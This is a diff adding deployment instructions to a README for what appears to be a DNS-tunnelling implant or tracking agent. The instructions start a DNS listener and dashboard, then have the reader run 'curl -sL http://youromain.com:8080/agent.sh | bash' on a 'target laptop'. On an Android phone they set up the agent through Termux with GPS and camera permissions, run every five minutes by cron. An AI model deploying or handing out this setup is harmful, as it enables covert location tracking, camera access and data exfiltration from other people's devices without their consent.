@@ -43,3 +43,36 @@ Because DNS traffic is rarely blocked or inspected deeply, this method is Extrem
    ```bash
    sudo systemctl stop systemd-resolved
    sudo systemctl disable systemd-resolved
+## INSTALL DEPENDENCIES
+`pip3 install dnslib flask`
+
+
+## RUN THE DNS LISTENER
+`cd server`
+`sudo python3 dnslistener.py`
+(Leave it running in the background or use `tmux`.)
+
+ ## (OPTIONAL) RUN THE DQASHBOARD 
+ `python3 ap.py`
+
+ ## Deploying the Agent
+**Linux Laptop**
+Host agent.sh on your server (e.g., with python3 -m http.server 8080 from the agent folder).
+On the target laptop, execute:
+ON LAPTOP EXECUTE....
+`curl -sL http://youromain.com:8080/agent.sh | bash`
+
+
+### Android Phone (via Termux)
+Install Termux from F-Droid and then Termux:API (for GPS & camera).
+Insite Termux, install needed packages:
+bash
+Copy
+pkg install termux-api curl jq dnsutils
+Download and run the agent:
+bash
+Copy
+curl -sL http://youromain.com/agent.sh -o agent.sh && bash agent.sh
+Grant GPS and camera permissions when the prompt appears.
+The agent will now execute every 5 minutes via crontab.
+---■
